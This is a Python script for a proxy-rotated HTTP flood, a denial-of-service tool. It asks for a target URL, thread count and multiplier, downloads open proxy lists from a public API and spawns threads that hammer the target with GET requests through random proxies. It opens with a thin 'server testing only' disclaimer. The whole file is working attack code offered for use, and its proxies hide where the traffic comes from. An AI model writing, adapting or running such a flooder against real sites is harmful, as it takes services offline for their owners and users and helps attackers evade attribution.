import requests
import sys
import time
import random
import threading

print("It is the end user's responsibility to obey all applicable laws.This script is desinged for server testing only.")

def opth():
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(i+1)+ " Created ")
		time.sleep(0.01)
	print("Wait A Few Seconds For Threads Ready To Attack...")
	time.sleep(3)
	input("Press Enter To Launch Attack!")
	global on
	on = True


on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pow
	global thr
	url = str(input("Target: " ))
	thr = int(input("Threads: " ))
	po = str(input("Port: " ))
	cho = str(input("Get New Proxies? (y/n): " ))
	if cho =='y':
		if po =='80':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all')
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print("Sucess Download Proxies List!")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all')
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print("Sucess Download Https Proxies List!")
	else:
		pass
	list = str(input("Proxies List (proxies.txt): " ))
	pprr = open(list).readlines()
	print("Proxies Count: "  + "%d" %len(pprr))
	pow = int(input("Multiplier (1-100):" ))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				print("Req. sent from "  + str(proxy[0])+":"+str(proxy[1]) + " to " + str(url))
				try:
					for y in range(pow):
						s.get(url)
						print("Req. sent from "  + str(proxy[0])+":"+str(proxy[1]) + " to " + str(url))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print("Proxy Error" )


if __name__ == "__main__":
	main()
